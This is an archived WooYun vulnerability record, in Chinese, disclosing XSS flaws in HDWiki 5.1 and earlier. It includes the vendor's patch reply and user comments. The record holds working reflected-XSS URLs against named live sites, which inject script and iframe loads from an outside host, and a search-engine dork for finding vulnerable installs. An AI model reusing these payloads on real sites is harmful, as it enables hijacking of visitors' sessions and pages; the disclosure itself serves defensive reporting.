{"id": 18476, "wybug_id": "wooyun-2012-010564", "wybug_title": "互动维客HDWiki(5.1及以下)各种xss 0day", "wybug_corp": "互动在线（北京）科技有限公司", "wybug_author": "random_", "wybug_date": "2012-08-04 17:39", "wybug_open_date": "2012-08-09 17:40", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-08-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 这个有一定的用户数量，可csrf、劫持首页、蠕虫等，cog也在其列。 详细说明：  由于偶尔原因发现cog存在wiki导致的xss可劫持首页，发现它的wiki是hdwiki的5.1版本。于是测试了其他的hdwiki发现存在同样的xss问题。问题总结如下。1. hdwiki的搜索有非持久xss，如：http://www.laohuaxia.com/index.php?search-fulltext-title-%5C%22%3E%3Ciframe%2Fsrc%3D%2F%2Ftmxk%26%2346%3Borg%3E--all-0-within-time-desc-1\n\nhttp://wiki.chowngroup.com/index.php?search-fulltext-title-%5C%22%3E%3Cscript%2Fsrc%3D%2F%2Ftmxk%26%2346%3Borg%2Fq%26%2346%3Bjs%3E--all-0-within-time-desc-1http://wiki.chowngroup.com/index.php?search-fulltext-title-TAG%3A%5C%22%3E%5C%27%3E%3Ciframe%2Fsrc%3D%2F%2Ftmxk%26%2346%3Borg%3E--all-0-within-time-desc-1\n\n2. hdwiki编辑词条的存储型xss，http://www.laohuaxia.com/index.php?doc-view-1572http://tmxk.org/thread-625-1-1.html词条标题，词条标签，词条内容均存在服务端未过滤的问题。\n\n\n\n3. hdwiki留言的存储型xss关键字：http://www.google.com.tw/search?q=intitle:powered+by+HDWiki   漏洞证明：     修复方案：  过滤各种提交，修复编辑器,打补丁。   版权声明：转载请注明来源 random_@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-08-09 17:40 厂商回复：  最新状态： 2012-08-09：首先感谢乌云网友提出此漏洞，我们技术部人员经过努力，修复信息如下：详情：漏洞1、hdwiki编辑词条的存储型xss漏洞2、hdwiki的搜索有非持久xss漏洞3、HDWiki 任意用户密码修改漏洞修复前须知：请提前做好代码备份工作，如您有做过二次开发，请对比代码，谨慎处理。修复步骤：1、请下载您对应编码版本的附件补丁包到本地并解压2、拷贝附件中的doc.php,user.php,reference.php至/control/下面（覆盖原有文件）3、（此步骤只针对HDWiki5.1版本的用户）拷贝附件中的editor.htm，viewdoc.htm至/view/default/下（覆盖原有文件）4、拷贝附件中的hdwiki.js至/js/jqeditor/下（覆盖原有文件）5、（此步骤只针对5.0UTF8版本的用户）拷贝附件中的install.php至/install/下（覆盖原有文件）帖子内容如下：http://kaiyuan.hudong.com/bbs/viewthread.php?tid=115225&extra=page%3D1   ", "replys": "漏洞评价：\n评论\n     2012-08-08 09:54 |    \t\t互动在线（北京）科技有限公司(乌云厂商)\t\t \n  感谢支持，安装包已更新，补丁包可擦看http://kaiyuan.hudong.com/bbs/viewthread.php?tid=115225&extra=page%3D1     \n     2012-08-10 08:36 |    \t\txyzy \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 无)\t\t \n  昵马。补丁包中有后门，刚百度看到 http://bbs.python520.com/thread-6926-1-1.html    \n     2012-08-10 10:06 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  = = 现在怎么流行，先忽略，再补充状态。。。    \n     2012-08-10 10:17 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  希望不要成为一种现象~~    \n     2013-05-07 20:23 |    \t\t邪少 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:7        )\t\t \n  这厂商最垃圾了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}